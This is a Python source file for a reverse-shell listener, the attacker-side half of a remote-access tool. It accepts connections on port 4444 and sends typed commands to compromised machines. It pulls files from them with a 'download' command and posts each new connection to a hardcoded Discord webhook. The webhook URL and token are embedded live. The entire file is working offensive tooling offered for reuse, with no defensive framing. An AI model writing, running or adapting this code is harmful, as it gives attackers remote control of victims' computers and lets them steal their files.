import socket
import threading
import requests
import os

WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1383916610019918029/pf_qhfokCz4r-DO1tFjAPXBWpstlC5Q8y3NgvwR9I4v30ixn2acQFOG7oW45pSfqWrdO'  # Use your own webhook

def handle_client(client_socket, address):
    print(f"[+] Connection from {address}")
    requests.post(WEBHOOK_URL, json={"content": f"ðŸŸ¢ Reverse shell connected from {address}"})

    while True:
        try:
            command = input(f"Shell@{address}> ")

            if command.lower() == 'exit':
                client_socket.send(b'exit')
                client_socket.close()
                break

            # Handle DOWNLOAD
            elif command.startswith("download "):
                filename = command.split(" ", 1)[1]
                client_socket.send(command.encode())

                with open(f"downloaded_{os.path.basename(filename)}", "wb") as f:
                    data = client_socket.recv(1024 * 100)
                    f.write(data)
                print(f"[+] Downloaded file saved as downloaded_{filename}")

            # Handle all other commands
            else:
                client_socket.send(command.encode())
                response = client_socket.recv(4096).decode()
                print(response)

        except Exception as e:
            print(f"[-] Connection lost: {e}")
            break

def start_listener(ip='0.0.0.0', port=4444):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((ip, port))
    server.listen(5)
    print(f"[*] Listening on {ip}:{port}")

    while True:
        client, addr = server.accept()
        thread = threading.Thread(target=handle_client, args=(client, addr))
        thread.start()

start_listener()

